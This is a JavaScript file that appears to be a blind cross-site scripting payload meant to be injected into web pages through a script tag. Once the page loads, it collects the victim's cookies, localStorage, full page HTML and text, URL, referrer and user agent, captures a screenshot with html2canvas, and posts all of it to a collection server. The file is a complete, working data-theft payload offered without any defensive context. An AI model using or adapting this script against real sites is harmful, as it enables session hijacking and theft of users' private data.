var data = {
    url:"",
    origin:"",
    userAgent:"",
    localStorage:"",
    screenshot_encoded:"",
    cookies:"",
    referrer:"",
    text:"",
    dom:"",
    title:"",
    iframe:window.top === window ? 'false' : 'true'
}
var e = null

function addEvent(element, eventName, fn) {
    if (element.addEventListener)
        element.addEventListener(eventName, fn, false);
    else if (element.attachEvent)
        // to support ie8
        element.attachEvent('on' + eventName, fn);
    }
    var s = document.createElement( 'script' );
    s.setAttribute( 'src', "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js" );
    document.body.appendChild( s );



function getDomText() {
    try{
        data.dom = document.documentElement.outerHTML


    } catch {
        data.dom = ''
    }
    var TextValues = [
		document.body.outerText,
		document.body.innerText,
		document.body.textContent,
	];
	for(var i = 0; i < TextValues.length; i++) {
		if(typeof TextValues[i] === 'string') {
            data.text = TextValues[i]
            return
		}
	}
    data.text = ''
}

function getUrl() {
    try {
        data.url = location.toString()
    } catch {
        data.url = ""
    }
}

function getLocalStorage() {
    try {
        data.localStorage = JSON.stringify(localStorage)
    } catch  {
        data.localStorage = ''
    }
}

function cookies() {
    try {
        data.cookies = document.cookie
    } catch  {
        data.cookies = ''
    }
}

function getReferrer() {
    try {
        data.referrer = document.referrer
    } catch  {
        data.referrer = ''
    }
}

function getUserAgent() {
    try {
        data.userAgent = navigator.userAgent
    } catch  {
        data.userAgent = ''
    }
}

function origin() {
    try {
        data.origin = location.origin
    } catch  {
        data.origin = ''
    }
}

function sendData(screend_data){
    data.screenshot_encoded = screend_data;
    (async () => {
        const rawResponse = await fetch('http://0.0.0.0:8081/post', {
          method: 'POST',
          headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        });
        const content = await rawResponse.json();
      
        console.log(content);
      })();
}

function screenshot(){
    html2canvas(document.body, { logging: true, letterRendering: 1, allowTaint: true , useCORS: true } ).then(function(canvas) {
        fg  = canvas.toDataURL()
        sendData(fg.replace('data:image/png;base64,',''))
    });
}

if( document.readyState == "complete" ) {


    getDomText()
    getUrl()
    getLocalStorage()
    cookies()
    getReferrer()
    getUserAgent()
    origin()

    data.title = document.title;
    screenshot()
} else { 

    addEvent( window, "load", function(){


    getDomText()
    getUrl()
    getLocalStorage()
    cookies()
    getReferrer()
    getUserAgent()
    origin()

    data.title = document.title;
        screenshot()
    });
}
//<script src="extractor.js"></script>
